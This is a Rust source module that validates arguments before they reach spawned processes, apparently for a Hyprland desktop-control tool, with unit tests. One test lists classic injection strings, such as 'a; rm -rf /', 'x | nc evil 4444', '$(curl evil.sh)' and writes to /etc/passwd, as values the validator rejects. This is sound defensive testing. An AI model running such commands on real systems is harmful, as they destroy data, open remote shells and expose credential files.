//! Input sanitization — the first defense layer of the request pipeline.
//!
//! Canonical spec: SECURITY.md "Request pipeline" and docs/TOOLS.md
//! `system_command` error table (`-32006 SanitizationRejected`). Every argument
//! that reaches a spawned process must pass [`sanitize_arg`]; identifiers
//! (window addresses, output names, workspace selectors) additionally pass
//! [`validate_identifier`]. All functions here are pure.

/// Maximum accepted argument length — 64 KiB per the `SanitizationRejected`
/// trigger in docs/TOOLS.md ("oversized strings (>64 KiB)").
pub const MAX_ARG_LEN: usize = 64 * 1024;

/// Maximum accepted identifier length (window addresses, class names, …).
pub const MAX_IDENT_LEN: usize = 256;

/// Shell metacharacters denied outright in any spawned-process argument.
/// `; & | ` $ ( ) { } [ ] < >` plus the C0/DEL control bytes handled below.
const DENY_CHARS: &[char] = &[
    ';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>',
];

/// Rejection reasons — callers map these to `-32006 SanitizationRejected`.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum SanitizeError {
    /// A shell metacharacter that must never reach an argv element.
    #[error("argument contains forbidden shell metacharacter {0:?}")]
    Metacharacter(char),
    /// C0 control byte, DEL, or a C1 control character — includes NUL,
    /// CR, LF, TAB. Newline injection is a `hyprctl dispatch` smuggling
    /// vector (THREAT_MODEL.md "Tampering").
    #[error("argument contains forbidden control character U+{0:04X}")]
    ControlChar(u32),
    /// Over the 64 KiB ceiling.
    #[error("argument exceeds maximum length of {MAX_ARG_LEN} bytes")]
    TooLong,
    /// `validate_identifier`: character outside the identifier charset.
    #[error("identifier contains invalid character {0:?}")]
    BadIdentChar(char),
    /// `validate_identifier`: empty or over [`MAX_IDENT_LEN`].
    #[error("identifier length {0} out of bounds (1..={MAX_IDENT_LEN})")]
    BadIdentLen(usize),
}

/// Validate one argv element destined for a spawned process.
///
/// Returns the input unchanged on success — sanitization here is
/// *reject-don't-mutate*: silently rewriting an argument would change
/// semantics the caller already committed to.
///
/// Rejects:
/// - shell metacharacters `; & | ` $ ( ) { } [ ] < >`
/// - C0 control bytes (`< 0x20` — covers `\n`, `\r`, `\0`, `\t`), `DEL`
/// - C1 control characters (`U+0080..=U+009F`)
/// - arguments longer than [`MAX_ARG_LEN`]
pub fn sanitize_arg(arg: &str) -> Result<&str, SanitizeError> {
    if arg.len() > MAX_ARG_LEN {
        return Err(SanitizeError::TooLong);
    }
    for c in arg.chars() {
        if DENY_CHARS.contains(&c) {
            return Err(SanitizeError::Metacharacter(c));
        }
        if c.is_control() {
            return Err(SanitizeError::ControlChar(c as u32));
        }
    }
    Ok(arg)
}

/// Validate an identifier-shaped argument (window address, output name,
/// workspace selector, element id, …).
///
/// Charset: ASCII alphanumeric plus `_ - . : @` — enough for Hyprland window
/// addresses (`0x55f0…`), output names (`DP-1`), AT-SPI ids (`/a11y/…` style
/// segments are *not* identifiers — slash is deliberately excluded), and
/// workspace selectors. Length must be `1..=MAX_IDENT_LEN`.
///
/// Note: `:` and `@` are admitted for `address:0x…` / `name@instance` forms;
/// `.` permits `foo.bar` classes but `..` alone is still rejected because
/// pure dot-sequences are path-traversal shaped.
pub fn validate_identifier(ident: &str) -> Result<&str, SanitizeError> {
    if ident.is_empty() || ident.len() > MAX_IDENT_LEN {
        return Err(SanitizeError::BadIdentLen(ident.len()));
    }
    if ident == "." || ident == ".." {
        return Err(SanitizeError::BadIdentChar('.'));
    }
    for c in ident.chars() {
        if !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':' | '@')) {
            return Err(SanitizeError::BadIdentChar(c));
        }
    }
    Ok(ident)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_ordinary_args() {
        for arg in [
            "clients",
            "-j",
            "%x %y %w %h",
            "address:0x55f0a1b2",
            "DP-1",
            "0,0 1920x1080",
            "focuswindow",
            "movetoworkspace",
            "workspace 2",
            "héllo wörld — ünïcode ok",
            "50%",
            "name@instance",
            "/usr/bin/grim", // paths are fine as *strings*; path policy is paths.rs
        ] {
            assert_eq!(sanitize_arg(arg).unwrap(), arg, "should accept {arg:?}");
        }
    }

    #[test]
    fn rejects_every_shell_metachar() {
        for m in [
            ';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>',
        ] {
            let arg = format!("pre{m}post");
            assert_eq!(
                sanitize_arg(&arg),
                Err(SanitizeError::Metacharacter(m)),
                "must reject {m:?}"
            );
        }
    }

    #[test]
    fn rejects_classic_injection_payloads() {
        for arg in [
            "a; rm -rf /",
            "x | nc evil 4444",
            "x && curl evil",
            "$(curl evil.sh)",
            "`id`",
            "a > /etc/passwd",
            "a < /etc/shadow",
            "${HOME}",
            "foo{bar}",
        ] {
            assert!(sanitize_arg(arg).is_err(), "must reject {arg:?}");
        }
    }

    #[test]
    fn rejects_control_bytes() {
        for arg in [
            "line1\nline2", // newline injection into `hyprctl dispatch`
            "a\rb",
            "a\tb",
            "a\u{7f}b",
            "\u{1b}[2J",  // ANSI escape
            "a\u{0085}b", // C1 NEL
        ] {
            assert!(
                matches!(sanitize_arg(arg), Err(SanitizeError::ControlChar(_))),
                "must reject {arg:?}"
            );
        }
        // NUL cannot appear inside a &str via a literal; construct it.
        let with_nul = String::from("a\0b");
        assert_eq!(
            sanitize_arg(&with_nul),
            Err(SanitizeError::ControlChar(0)),
            "must reject embedded NUL"
        );
    }

    #[test]
    fn rejects_oversized_args() {
        let big = "x".repeat(MAX_ARG_LEN + 1);
        assert_eq!(sanitize_arg(&big), Err(SanitizeError::TooLong));
        let at_limit = "x".repeat(MAX_ARG_LEN);
        assert!(sanitize_arg(&at_limit).is_ok());
    }

    #[test]
    fn identifier_charset_and_length() {
        for ok in [
            "0x55f0a1b2",
            "DP-1",
            "firefox",
            "org.foo.Bar",
            "ws_2",
            "a:b@c",
        ] {
            assert_eq!(validate_identifier(ok).unwrap(), ok);
        }
        for (bad, why) in [
            ("", "empty"),
            ("a/b", "slash — traversal-shaped"),
            ("a\\b", "backslash"),
            ("a b", "space"),
            ("..", "dot-dot"),
            (".", "dot"),
            ("a;b", "metachar"),
            ("a\nb", "control"),
        ] {
            assert!(validate_identifier(bad).is_err(), "{why}: {bad:?}");
        }
        let long = "x".repeat(MAX_IDENT_LEN + 1);
        assert_eq!(
            validate_identifier(&long),
            Err(SanitizeError::BadIdentLen(MAX_IDENT_LEN + 1))
        );
    }
}
